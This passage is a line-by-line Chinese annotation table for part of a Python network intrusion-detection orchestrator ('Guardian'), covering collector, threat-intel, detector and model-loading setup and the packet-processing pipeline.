| 173 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 174 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 175 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 缓存 / 队列（Redis，失败自动回退到内存）-------------------` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.redis = RedisClient(` |
| 177 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            host=self.cfg.redis_host,` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            port=self.cfg.redis_port,` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            db=self.cfg.redis_db,` |
| 180 | 占位语句：保持语法完整但当前不执行操作。 | `            password=self.cfg.redis_password,` |
| 181 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 182 | 注释：解释下面或当前这段代码的设计意图。 | `        # 预创建 consumer group，便于 Web 层启动后立即开始消费（不存在亦不报错）` |
| 183 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 184 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.redis.stream_ensure_group(` |
| 185 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._ALERT_STREAM, self._ALERT_STREAM_GROUP` |
| 186 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 187 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001 - Streams 不可用不影响主流程` |
| 188 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("[Guardian] Streams group 初始化失败: %s", exc)` |
| 189 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 190 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 采集器 ----------------------------------------------------` |
| 191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.packet_collector: Optional[PacketCollector] = None` |
| 192 | 条件判断：满足条件时进入对应分支。 | `        if self.cfg.enable_packet_capture:` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self.packet_collector = PacketCollector(` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                interface=self.cfg.packet_interface` |
| 195 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 196 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.web_log_collector: Optional[LogCollector] = None` |
| 198 | 条件判断：满足条件时进入对应分支。 | `        if self.cfg.enable_web_log:` |
| 199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self.web_log_collector = LogCollector(` |
| 200 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                log_path=self.cfg.web_log_path, log_type="web"` |
| 201 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 202 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 203 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 威胁情报（前置过滤）---------------------------------------` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.threat_intel = ThreatIntelCollector(` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            abuseipdb_key=os.environ.get("ABUSEIPDB_API_KEY", ""),` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            virustotal_key=os.environ.get("VIRUSTOTAL_API_KEY", ""),` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            external_http_timeout=float(os.environ.get("THREAT_INTEL_HTTP_TIMEOUT", "5")),` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            external_wait_sec=float(os.environ.get("THREAT_INTEL_EXTERNAL_WAIT_SEC", "0.45")),` |
| 209 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._ioc_db_app = None` |
| 211 | 条件判断：满足条件时进入对应分支。 | `        if not self.cfg.enable_flask:` |
| 212 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._bind_ioc_database()` |
| 213 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 214 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 特征提取器 ------------------------------------------------` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.flow_aggregator = FlowWindowAggregator(` |
| 216 | 函数调用：执行已有函数/方法完成当前步骤。 | `            FlowWindowAggregatorConfig(` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                min_flow_packets=self.cfg.flow_min_packets,` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                flow_idle_timeout_sec=self.cfg.flow_idle_timeout_sec,` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                aggregation_window_sec=self.cfg.flow_agg_window_sec,` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                single_packet_idle_policy=self.cfg.single_packet_idle_policy,` |
| 221 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 222 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.web_extractor = WebFeatureExtractor()` |
| 224 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 225 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 实时链路可观测计数（读取失败不抛、不阻断循环）------------` |
| 226 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._packet_queue_read_errors: int = 0` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._metrics = GuardianMetricsCollector()` |
| 228 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._prev_malformed: int = 0` |
| 229 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._prev_single_disc: int = 0` |
| 230 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._prev_partial_disc: int = 0` |
| 231 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 232 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 检测引擎（4 个）------------------------------------------` |
| 233 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ddos_detector = DDoSDetector()` |
| 234 | 注释：解释下面或当前这段代码的设计意图。 | `        # use_deep_learning=False：优先加载随机森林备选模型（CPU 友好）` |
| 235 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.intrusion_detector = IntrusionDetector(use_deep_learning=False)` |
| 236 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.web_detector = WebAttackDetector()` |
| 237 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.anomaly_detector = AnomalyDetector()` |
| 238 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.model_registry = ModelRegistry(` |
| 240 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self.cfg.model_dir,` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            audit_sink=self.security_logger,` |
| 242 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 243 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 244 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 融合决策 --------------------------------------------------` |
| 245 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.fusion_engine = FusionEngine()` |
| 246 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 247 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 响应引擎（dry_run 来自环境变量）--------------------------` |
| 248 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.responder = SecurityResponder(` |
| 249 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dry_run=self.cfg.dry_run,` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            security_logger=self.security_logger,` |
| 251 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 252 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 253 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- Flask（可选，用于向前端广播告警）------------------------` |
| 254 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._flask_app = None` |
| 255 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._push_alert_fn = None` |
| 256 | 条件判断：满足条件时进入对应分支。 | `        if self.cfg.enable_flask:` |
| 257 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._try_attach_flask()` |
| 258 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 259 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 260 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[Guardian] 模块初始化完成 dry_run=%s redis_mode=%s flask=%s",` |
| 261 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self.cfg.dry_run,` |
| 262 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self.redis.mode,` |
| 263 | 函数调用：执行已有函数/方法完成当前步骤。 | `            bool(self._push_alert_fn),` |
| 264 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 265 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 266 | 函数定义：声明 `_bind_ioc_database` 的输入、处理逻辑和返回结果。 | `    def _bind_ioc_database(self) -> None:` |
| 267 | 文档字符串：说明当前模块、类或函数的职责。 | `        """绑定 DATABASE_URL 上的 IOC 表，启动时灌入内存前置缓存。"""` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        uri = (os.environ.get("DATABASE_URL") or "").strip()` |
| 269 | 条件判断：满足条件时进入对应分支。 | `        if not uri or ":memory:" in uri:` |
| 270 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 271 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 272 | 导入对象：从指定模块引入类、函数或常量。 | `            from flask import Flask` |
| 273 | 导入对象：从指定模块引入类、函数或常量。 | `            from web.database import db, init_db_tables` |
| 274 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            root = Path(__file__).resolve().parent` |
| 276 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mini = Flask(__name__)` |
| 277 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mini.root_path = str(root)` |
| 278 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mini.config["SQLALCHEMY_DATABASE_URI"] = uri` |
| 279 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mini.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False` |
| 280 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.init_app(mini)` |
| 281 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `            import web.models  # noqa: F401` |
| 282 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 283 | 上下文管理：自动管理资源打开与释放。 | `            with mini.app_context():` |
| 284 | 函数调用：执行已有函数/方法完成当前步骤。 | `                init_db_tables(mini)` |
| 285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                n = self.threat_intel.refresh_local_from_db()` |
| 286 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.threat_intel.bind_flask_app(mini)` |
| 287 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._ioc_db_app = mini` |
| 288 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[Guardian] IOC 数据库已绑定，内存加载 %d 条", n)` |
| 289 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 290 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[Guardian] IOC 数据库绑定失败（仅内存黑名单）: %s", exc)` |
| 291 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 292 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 293 | 注释：解释下面或当前这段代码的设计意图。 | `    # Flask 集成（可选；不影响独立运行）` |
| 294 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 295 | 函数定义：声明 `_try_attach_flask` 的输入、处理逻辑和返回结果。 | `    def _try_attach_flask(self) -> None:` |
| 296 | 文档字符串：说明当前模块、类或函数的职责。 | `        """尝试加载 Phase 7 工厂函数；失败仅记录日志，不影响主流程。"""` |
| 297 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 298 | 注释：解释下面或当前这段代码的设计意图。 | `            # 延迟导入，避免纯检测链路场景下拉起 Flask 依赖` |
| 299 | 导入对象：从指定模块引入类、函数或常量。 | `            from web.app import create_app, push_alert  # noqa: WPS433` |
| 300 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 301 | 函数调用：执行已有函数/方法完成当前步骤。 | `            app, _socketio = create_app()` |
| 302 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._flask_app = app` |
| 303 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._push_alert_fn = push_alert` |
| 304 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self.threat_intel = app.extensions["guardian_threat_intel"]` |
| 305 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._ioc_db_app = app` |
| 306 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[Guardian] 已接入 Phase 7 Flask 工厂，告警将广播到前端")` |
| 307 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001 - 无 Flask 时降级到独立模式` |
| 308 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[Guardian] 未启用 Flask 告警广播: %s", exc)` |
| 309 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._flask_app = None` |
| 310 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._push_alert_fn = None` |
| 311 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 312 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 313 | 注释：解释下面或当前这段代码的设计意图。 | `    # 模型加载（单模型失败不拖垮整体）` |
| 314 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 315 | 函数定义：声明 `load_models` 的输入、处理逻辑和返回结果。 | `    def load_models(self) -> Dict[str, bool]:` |
| 316 | 文档字符串：说明当前模块、类或函数的职责。 | `        """经 ModelRegistry 解析路径并逐个加载；单个失败仅记录日志，其余继续。` |
| 317 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 318 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 319 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dict[str, bool]: 各引擎是否成功加载。` |
| 320 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 321 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        plan = [` |
| 322 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ("ddos", "DDoS", self.ddos_detector),` |
| 323 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ("intrusion", "Intrusion", self.intrusion_detector),` |
| 324 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ("web_attack", "WebAttack", self.web_detector),` |
| 325 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ("anomaly", "Anomaly", self.anomaly_detector),` |
| 326 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 327 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results: Dict[str, bool] = {}` |
| 328 | 循环：逐个处理集合或迭代器中的元素。 | `        for family, label, detector in plan:` |
| 329 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            path = self.model_registry.resolve_load_path(family)` |
| 330 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 331 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ok = self.model_registry.try_load_detector(family, detector)` |
| 332 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                results[label] = ok` |
| 333 | 条件判断：满足条件时进入对应分支。 | `                if ok:` |
| 334 | 日志记录：输出运行状态、调试信息或异常线索。 | `                    logger.info(` |
| 335 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "[Guardian] 模型加载成功: %s (%s)",` |
| 336 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        label,` |
| 337 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        path or "(registry path)",` |
| 338 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 339 | 条件分支：前面条件不满足时继续判断。 | `                elif path is None:` |
| 340 | 日志记录：输出运行状态、调试信息或异常线索。 | `                    logger.warning(` |
| 341 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        "[Guardian] 未找到模型路径，跳过 %s（请检查 models/saved 布局或训练产物）",` |
| 342 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        label,` |
| 343 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 344 | 日志记录：输出运行状态、调试信息或异常线索。 | `                    self.security_logger.log_system(` |
| 345 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        f"模型路径缺失: {label} family={family}", level="warning"` |
| 346 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 347 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 348 | 日志记录：输出运行状态、调试信息或异常线索。 | `                    logger.error(` |
| 349 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        "[Guardian] 模型加载失败 %s（将降级跳过此引擎）path=%s",` |
| 350 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        label,` |
| 351 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        path,` |
| 352 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 353 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001 - 加载失败不应拖垮系统` |
| 354 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                results[label] = False` |
| 355 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error(` |
| 356 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "[Guardian] 模型加载异常 %s: %s（将降级跳过此引擎）",` |
| 357 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    label,` |
| 358 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    exc,` |
| 359 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 360 | 日志记录：输出运行状态、调试信息或异常线索。 | `                self.security_logger.log_system(` |
| 361 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    f"模型加载异常: {label}: {exc}", level="error"` |
| 362 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 363 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 364 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        loaded = sum(1 for v in results.values() if v)` |
| 365 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[Guardian] 模型加载汇总：成功 %d / 共 %d", loaded, len(plan))` |
| 366 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 367 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 368 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            engines = [` |
| 369 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.ddos_detector,` |
| 370 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.intrusion_detector,` |
| 371 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.web_detector,` |
| 372 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.anomaly_detector,` |
| 373 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ]` |
| 374 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            n_ready = sum(1 for e in engines if bool(getattr(e, "is_ready", False)))` |
| 375 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._metrics.set_model_ready_gauge(n_ready)` |
| 376 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 377 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 378 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 379 | 注释：解释下面或当前这段代码的设计意图。 | `        # Web 规则引擎恒可用（规则永远兜底），即使 ML 模型加载失败也不影响检测` |
| 380 | 注释：解释下面或当前这段代码的设计意图。 | `        # IntrusionDetector / AnomalyDetector / DDoSDetector 未就绪时` |
| 381 | 注释：解释下面或当前这段代码的设计意图。 | `        # detect() 会返回 None，由融合决策层统一跳过。` |
| 382 | 返回结果：把处理后的值交回调用方。 | `        return results` |
| 383 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 384 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 385 | 注释：解释下面或当前这段代码的设计意图。 | `    # 流量入口 1：数据包` |
| 386 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 387 | 函数定义：声明 `process_packet` 的输入、处理逻辑和返回结果。 | `    def process_packet(self, pkt: Dict[str, Any]) -> None:` |
| 388 | 文档字符串：说明当前模块、类或函数的职责。 | `        """处理单个数据包（经聚合器，与主循环批量路径一致）。"""` |
| 389 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self.process_packet_batch([pkt])` |
| 390 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 391 | 函数定义：声明 `process_packet_batch` 的输入、处理逻辑和返回结果。 | `    def process_packet_batch(self, packets: List[Dict[str, Any]]) -> None:` |
| 392 | 文档字符串：说明当前模块、类或函数的职责。 | `        """批量处理数据包：威胁情报过滤 → 流窗口聚合 → 检测；异常不抛出。` |
| 393 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 394 | 代码语句：参与当前文件的业务流程或数据处理。 | `        允许 \`\`packets\`\` 为空：仍会推进聚合器时钟并刷新空闲超时流。` |
| 395 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 396 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now = time.time()` |
| 397 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 398 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._metrics.record_packets_seen(len(packets))` |
| 399 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 400 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 401 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 402 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        filtered: List[Dict[str, Any]] = []` |
| 403 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ti_drops = 0` |
| 404 | 循环：逐个处理集合或迭代器中的元素。 | `        for pkt in packets:` |
| 405 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 406 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                src_ip = str(pkt.get("src_ip", ""))` |
| 407 | 条件判断：满足条件时进入对应分支。 | `                if src_ip and self._is_threat_intel_hit(src_ip):` |
| 408 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    ti_drops += 1` |
| 409 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 410 | 函数调用：执行已有函数/方法完成当前步骤。 | `                filtered.append(pkt)` |
| 411 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 412 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error("[Guardian] 单包前置处理异常: %s", exc, exc_info=True)` |
| 413 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 414 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 415 | 条件判断：满足条件时进入对应分支。 | `        if ti_drops:` |
| 416 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 417 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._metrics.record_threat_intel_drops(ti_drops)` |
| 418 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception:  # noqa: BLE001` |
| 419 | 占位语句：保持语法完整但当前不执行操作。 | `                pass` |
| 420 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 421 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 422 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flow_features = self.flow_aggregator.tick(filtered, now=now)` |
| 423 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 424 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[Guardian] 流窗口聚合异常: %s", exc, exc_info=True)` |
| 425 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 426 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 427 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 428 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            c = self.flow_aggregator.counters` |
| 429 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._metrics.record_aggregator_deltas(` |
| 430 | 代码语句：参与当前文件的业务流程或数据处理。 | `                c.malformed_packet_skips - self._prev_malformed,` |
| 431 | 代码语句：参与当前文件的业务流程或数据处理。 | `                c.single_packet_discarded - self._prev_single_disc,` |
| 432 | 代码语句：参与当前文件的业务流程或数据处理。 | `                c.partial_flow_discarded - self._prev_partial_disc,` |
| 433 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 434 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._prev_malformed = c.malformed_packet_skips` |
| 435 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._prev_single_disc = c.single_packet_discarded` |
| 436 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._prev_partial_disc = c.partial_flow_discarded` |
| 437 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 438 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 439 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 440 | 循环：逐个处理集合或迭代器中的元素。 | `        for feat in flow_features:` |
| 441 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 442 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                t0 = time.perf_counter()` |
| 443 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                results = self._safe_detect_many(feat)` |
| 444 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                final = self.fusion_engine.fuse(results)` |
| 445 | 异常保护：尝试执行可能失败的逻辑。 | `                try:` |
| 446 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._metrics.record_detection_latency_ms(` |
| 447 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        (time.perf_counter() - t0) * 1000.0` |
| 448 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 449 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                except Exception:  # noqa: BLE001` |
| 450 | 占位语句：保持语法完整但当前不执行操作。 | `                    pass` |
| 451 | 条件判断：满足条件时进入对应分支。 | `                if final.threat_type != "normal":` |
| 452 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._on_threat(final)` |
| 453 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 454 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error(` |
| 455 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "[Guardian] 单条流特征检测/融合异常: %s", exc, exc_info=True` |
| 456 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 457 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 458 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 459 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 460 | 注释：解释下面或当前这段代码的设计意图。 | `    # 流量入口 2：Web 日志` |
| 461 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 462 | 函数定义：声明 `process_web_log` 的输入、处理逻辑和返回结果。 | `    def process_web_log(self, log_entry: Dict[str, Any]) -> None:` |
| 463 | 文档字符串：说明当前模块、类或函数的职责。 | `        """处理单条 Web 访问日志；任何异常都不得抛出到主循环。"""` |
| 464 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 465 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            src_ip = str(log_entry.get("src_ip", ""))` |
| 466 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
